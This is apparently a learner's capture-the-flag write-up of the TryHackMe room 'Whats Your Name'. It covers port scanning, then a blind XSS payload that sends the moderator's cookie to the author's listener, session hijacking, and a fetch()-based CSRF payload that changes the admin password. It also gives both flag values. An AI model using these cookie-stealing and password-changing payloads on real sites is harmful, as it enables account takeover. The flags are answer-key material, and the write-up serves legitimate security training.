# Whats Your Name

**Platform:** TryHackMe

**Date:** **2026-09-15**

**Difficulty:** Medium

**Category:** Web / Client-Side

**Room URL:** `https://tryhackme.com/room/whatsyourname`

**Status:** ✅ Completed

---

## 📌 What Was This Room About?

> This room focuses mainly on client-side vulnerabilities, especially XSS and CSRF. The goal was to first steal the moderator's session using XSS and then use the access I gained to eventually become an administrator and retrieve both flags.

---

## 🔍 Reconnaissance

Before starting the machine, I added the target IP to my `/etc/hosts` file and mapped it to:

```text
worldwap.thm
```

This was required by the room so that I could access the website using the correct hostname.

With that done, I was ready to start enumeration.

### Nmap Scan

As usual, I started with Nmap to find all the open ports.

```bash
nmap -sS -p- -T4 worldwap.thm
```

I then performed version detection and HTTP enumeration to get more information about the services.

```bash
nmap -sV --script http-enum worldwap.thm
```

**Results:**

|Port|Service|Version|Notes|
|---|---|---|---|
|22|SSH|OpenSSH 8.2p1|SSH service|
|80|HTTP|Apache 2.4.41|WorldWap website|
|8081|HTTP|Apache 2.4.41|Second web application|

Both HTTP ports were running **Apache 2.4.41**.

---

## 🧭 Steps I Took

### Step 1 — Enumerating the Web Application

- **What I did:**
    

Since ports `80` and `8081` were both running HTTP, I started enumerating directories on both of them using Gobuster.

```text
Gobuster
```

The results showed that both ports had similar directory structures.

I then opened port `80`.

The website was advertising a social network called **WorldWap** and had a registration page.

The interesting part was the message telling me that my registration details would be reviewed by a **moderator**.

That immediately stood out to me.

If a moderator is actually going to review the information I submit, then I should probably test whether I can get something malicious to execute in their browser.

- **Command/Tool used:**
    

```bash
gobuster
```

- **What I found:**
    

I found the WorldWap registration functionality and confirmed that a moderator would review submitted registration information.

- **Why it matters:**
    

This gave me a potential path toward a **blind XSS** attack.

Instead of attacking the moderator directly, I could try to make their browser execute JavaScript when they viewed my registration.

---

### Step 2 — Testing for XSS

- **What I did:**
    

I registered an account and tried logging in with the credentials I had just created.

I couldn't access the application because the moderator still had to verify my account.

So I started testing the registration fields for **stored/blind XSS**.

I used this payload:

```html
<img src=x onerror="window.location='http://IP:PORT?'+document.cookie;">
```

The basic idea is that the browser tries to load an image called `x`.

That image doesn't exist, so the `onerror` event runs.

The JavaScript then redirects the moderator's browser to my machine while adding their cookies to the request.

So the attack looked like this:

```text
My registration
      ↓
XSS payload stored
      ↓
Moderator reviews my details
      ↓
JavaScript executes
      ↓
Moderator's cookie sent to me
```

- **Command/Tool used:**
    

```html
<img src=x onerror="window.location='http://IP:PORT?'+document.cookie;">
```

- **What I found:**
    

My first attempt failed because the username field had a length restriction.

I changed the username and submitted the payload again.

This time it worked.

- **Why it matters:**
    

This was the main foothold I needed.

If I could steal the moderator's session cookie, I could potentially authenticate as the moderator without knowing their password.

---

### Step 3 — Stealing the Moderator Session

- **What I did:**
    

I started a simple Python HTTP server to listen for incoming requests:

```bash
python3 -m http.server 4444
```

Then I waited for the moderator to review my registration.

After some time, the moderator's browser executed my XSS payload.

My listener received the request containing the moderator's session information.

I now had the moderator's `PHPSESSID`.

- **Command/Tool used:**
    

```bash
python3 -m http.server 4444
```

- **What I found:**
    

I successfully captured the moderator's session cookie.

- **Why it matters:**
    

A session cookie can be enough to authenticate as another user.

Instead of trying to crack a password, I could simply replace my own session cookie with the moderator's one.

---

### Step 4 — Accessing the Moderator Account

- **What I did:**
    

I opened the browser developer tools and replaced my `PHPSESSID` with the moderator's stolen cookie.

Then I refreshed the page.

I was now authenticated as the moderator.

The moderator dashboard itself wasn't very interesting, so I moved over to port `8081` and accessed:

```text
/dashboard.php
```

That gave me access to the moderator functionality.

- **Command/Tool used:**
    

```text
Browser Developer Tools
```

- **What I found:**
    

I successfully accessed the moderator account.

The first flag was:

```text
ModP@wnEd
```

- **Why it matters:**
    

I had successfully gone from a normal registered user to the moderator account without ever knowing the moderator's password.

The attack chain so far was:

```text
Registration
    ↓
Blind XSS
    ↓
Moderator's PHPSESSID
    ↓
Session hijacking
    ↓
Moderator account
    ↓
First flag
```

---

### Step 5 — Finding the Password Change Function

- **What I did:**
    

While exploring the moderator dashboard, I found two interesting features:

1. A chat with the admin **AI**
    
2. A password-change form
    

I tried changing the moderator password normally.

However, the application rejected the request because password changes were restricted to administrators.

So I couldn't simply change the password myself.

Instead, I started thinking about whether I could make the administrator's browser perform the request for me.

- **Command/Tool used:**
    

```text
Browser
Burp Suite
```

- **What I found:**
    

The password-change endpoint was:

```text
/change_password.php
```

and it accepted a POST request containing the new password.

- **Why it matters:**
    

I now had an endpoint that could potentially be abused through a client-side attack.

Since the application also gave me a way to interact with the admin through the chat, this was worth investigating.

---

### Step 6 — CSRF / Forcing the Admin's Browser to Change the Password

- **What I did:**
    

I decided to use the chat to make the administrator's browser send a password-change request.

I crafted this payload:

```html
<img src="x" onerror="
  fetch('http://worldwap.thm:8081/change_password.php', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'new_password=admin123'
  });
">
```

The important part here was:

```javascript
credentials: 'include'
```

This tells the browser to include its existing authentication cookies with the request.

So when the administrator's browser executed the payload, it sent the password-change request while authenticated as the administrator.

The attack basically looked like this:

```text
My malicious message
        ↓
Admin opens the chat
        ↓
JavaScript executes
        ↓
Admin's browser sends POST request
        ↓
/change_password.php
        ↓
Admin password changed
```

- **Command/Tool used:**
    

```text
Burp Suite
Browser
```

- **What I found:**
    

The password was successfully changed to:

```text
admin123
```

- **Why it matters:**
    

I could now log in using the administrator credentials.

This was the privilege escalation step.

---

### Step 7 — Getting the Admin Flag

- **What I did:**
    

I went back to the login page and logged in using the new password.

```text
Password: admin123
```

After logging in, I confirmed that I had administrator access.

The admin panel contained the final flag.

- **Command/Tool used:**
    

```text
Web Browser
```

- **What I found:**
    

The final flag was:

```text
AdM!nP@wnEd
```

- **Why it matters:**
    

I had successfully escalated from a normal user → moderator → administrator using a chain of client-side vulnerabilities.

---

## 🛠 Commands Used

|Command / Tool|What It Does|
|---|---|
|`nmap -sS -p- -T4 worldwap.thm`|Scans all TCP ports on the target|
|`nmap -sV --script http-enum worldwap.thm`|Detects service versions and enumerates HTTP information|
|`gobuster`|Enumerates hidden directories and files|
|`python3 -m http.server 4444`|Starts a simple HTTP server to receive the XSS request|
|Browser Developer Tools|Used to replace the stolen session cookie|
|Burp Suite|Used to inspect and modify HTTP requests|
|`fetch()`|Used to make the password-change request from the victim's browser|

---

## 🚩 Flags Found

|Flag Value||
|---|---|
|Moderator flag|`ModP@wnEd`|
|Admin flag|`AdM!nP@wnEd`|

---

## 💡 What I Learned

- **Stored/blind XSS** can be much more dangerous when another privileged user is guaranteed to view the submitted content.
    
- Session cookies can be enough to completely take over another user's authenticated session if protections such as `HttpOnly` aren't properly configured.
    
- **CSRF** can allow an attacker to make an authenticated user's browser perform actions that the user never intended.
    
- I learned how powerful it can be to chain vulnerabilities together. The XSS didn't directly give me administrator access, but it gave me the moderator session, which opened up the next part of the attack.
    
- The biggest thing I learned from this room is that **client-side vulnerabilities can become much more serious when they involve privileged users.**
    

---

## ❓ What Confused Me / What to Research Next

- I want to understand the difference between **stored XSS, reflected XSS, and blind XSS** more deeply.
    
- I want to practice more CSRF attacks and understand exactly when browsers include authentication cookies.
    
- I also want to research the different protections used against XSS and CSRF, especially `HttpOnly`, `SameSite`, CSRF tokens, and proper input/output encoding.
    

---

## 🔗 Linked Notes

- [Nmap](https://chatgpt.com/c/Nmap)
    
- [Gobuster](https://chatgpt.com/c/Gobuster)
    
- [Burp Suite](Burp Suite)
    
- [XSS](https://chatgpt.com/c/XSS)
    
- [Blind XSS](Blind XSS)
    
- [Session Hijacking](Session Hijacking)
    
- [CSRF](https://chatgpt.com/c/CSRF)
    
- [Web Exploitation](Web Exploitation)
    

---

## 📎 Resources Used

> Links to tutorials, writeups, or documentation that helped me.

- TryHackMe — Whats Your Name?
    
- OWASP — Cross-Site Scripting (XSS)
    
- OWASP — Cross-Site Request Forgery (CSRF)
    

---

_Report written in_ **TryHackMe Vault** _— part of my ethical hacking journey 🛡️_